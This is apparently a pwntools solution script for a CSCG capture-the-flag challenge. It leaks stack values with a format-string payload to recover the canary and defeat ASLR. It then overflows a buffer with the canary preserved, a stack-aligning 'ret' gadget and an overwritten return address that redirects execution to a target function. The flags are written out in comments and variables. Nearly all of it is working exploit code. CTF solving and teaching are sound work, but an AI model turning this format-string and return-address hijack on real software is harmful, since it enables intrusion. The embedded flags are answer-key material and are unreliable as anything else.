#!/usr/bin/env python3
#CSCG{NOW_GET_VOLDEMORT_!!}
#python3 solution.py

from pwn import *

format_string = " | ".join(["%p" for _ in range(0,42)])
target_offset = 0x231
ret_offset = 0x434
previous_flag = b"CSCG{NOW_PRACTICE_EVEN_MORE}"
#previous_flag = b"CSCG{FLAG_FROM_STAGE_1}"
#previous_flag = b"CSCG{XXXXXXXXXXXXXXXXXXXXXX}"
expected = b"Expelliarmus"
null_byte = b"\x00" # to validate the strcmp

p = remote("7b000000ea2fd627976ac49b-intro-pwn-2.challenge.broker.cscg.live", 31337, ssl=True)
#p = process("./pwn2")
#raw_input("attach gdb")

p.recvuntil("Enter the password of stage 1:")
payload = previous_flag + null_byte
print("password: ", payload)
p.sendline(payload)

p.recvuntil("Enter your witch name:")
p.sendline(format_string)

leaks = p.recvuntil("enter your magic spell:")  # return bytes
leaks = leaks.decode().split(' | ')   # convert byte to string
print("leaked address: ",leaks[-2]) # to defeat ASLR

canary = int(leaks[-4], 16)
print("stack canary: ", hex(canary))

target_address = int(leaks[-2], 16) - target_offset
print("target address: ",hex(target_address))

# extra_ret can points to any 'ret' instruction. The idea is to align the rsp to multiple of 16B, so that new stack frame i.e. stack frame of target function aligned correctly.
# hence, first address to 'ret' is added so that it again pop/rip the next stored address in the stack. 
# this next address will point to correct target address and now rsp is also a muliple of 16B.
extra_ret = int(leaks[-2], 16) - ret_offset  #pointing to 'ret' in deregister_tm_clones() 
print("extra return address: ",hex(extra_ret))

pad = b'A' * cyclic_find("cnaa") #cyclic(512)
rbp = b'A' * 8
payload = expected + null_byte + pad + p64(canary) + rbp  + p64(extra_ret) + p64(target_address)
print(payload)
p.sendline(payload)

p.interactive()

